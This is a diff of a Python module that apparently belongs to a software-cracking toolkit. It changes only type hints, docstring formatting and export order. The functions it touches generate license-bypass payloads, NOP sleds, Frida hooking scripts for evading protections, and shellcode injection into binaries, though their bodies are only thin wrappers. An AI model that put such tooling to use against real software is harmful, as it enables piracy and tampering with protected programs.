+def generate_payload(payload_type: str, **kwargs) -> bytes | None:  # pylint: disable=unused-argument
+    """Generate a payload using the default generator.
 
     Args:
         payload_type: Type of payload to generate
@@ -1873,26 +1837,26 @@ def generate_payload(payload_type: str, **kwargs) -> Optional[bytes]:  # pylint:
 
     Returns:
         Optional[bytes]: Generated payload
+
     """
     generator = PayloadGenerator()
     return generator.generate_simple_payload(payload_type)
 
-def generate_advanced_payload(strategy: Dict[str, Any]) -> Optional[bytes]:
-    """
-    Generate an advanced payload using the AdvancedPayloadGenerator.
+def generate_advanced_payload(strategy: dict[str, Any]) -> bytes | None:
+    """Generate an advanced payload using the AdvancedPayloadGenerator.
 
     Args:
         strategy: Strategy dictionary for payload generation
 
     Returns:
         Optional[bytes]: Generated payload
+
     """
     generator = AdvancedPayloadGenerator()
     return generator.generate_license_bypass_payload(strategy)
 
 def apply_patch(binary_data: bytes, offset: int, patch_data: bytes) -> bytes:
-    """
-    Apply a patch to binary data.
+    """Apply a patch to binary data.
 
     Args:
         binary_data: Original binary data
@@ -1901,25 +1865,25 @@ def apply_patch(binary_data: bytes, offset: int, patch_data: bytes) -> bytes:
 
     Returns:
         bytes: Patched binary data
+
     """
     return binary_data[:offset] + patch_data + binary_data[offset + len(patch_data):]
 
 def create_nop_sled(length: int) -> bytes:
-    """
-    Create a NOP sled of specified length.
+    """Create a NOP sled of specified length.
 
     Args:
         length: Length in bytes
 
     Returns:
         bytes: NOP sled
+
     """
     generator = PayloadGenerator()
     return generator.generate_nop_sled(length)
 
 def generate_complete_api_hooking_script(app, hook_types=None) -> str:
-    """
-    Generate comprehensive Frida API hooking scripts for various protection bypass types.
+    """Generate comprehensive Frida API hooking scripts for various protection bypass types.
 
     Args:
         app: Application instance
@@ -1927,6 +1891,7 @@ def generate_complete_api_hooking_script(app, hook_types=None) -> str:
 
     Returns:
         str: Frida script for API hooking
+
     """
     if hook_types is None:
         hook_types = ["hardware_id", "debugger", "time", "network"]
@@ -2264,8 +2229,7 @@ def generate_complete_api_hooking_script(app, hook_types=None) -> str:
     return final_script
 
 def inject_shellcode(binary_data: bytes, shellcode: bytes, injection_point: int) -> bytes:
-    """
-    Inject shellcode into binary data.
+    """Inject shellcode into binary data.
 
     Args:
         binary_data: Original binary data
@@ -2274,6 +2238,7 @@ def inject_shellcode(binary_data: bytes, shellcode: bytes, injection_point: int)
 
     Returns:
         bytes: Modified binary data
+
     """
     return apply_patch(binary_data, injection_point, shellcode)
 
@@ -2283,6 +2248,6 @@ __all__ = [
     "PayloadGenerator",
     "apply_patch",
     "create_nop_sled",
-    "inject_shellcode",
     "generate_complete_api_hooking_script",
+    "inject_shellcode",
 ]
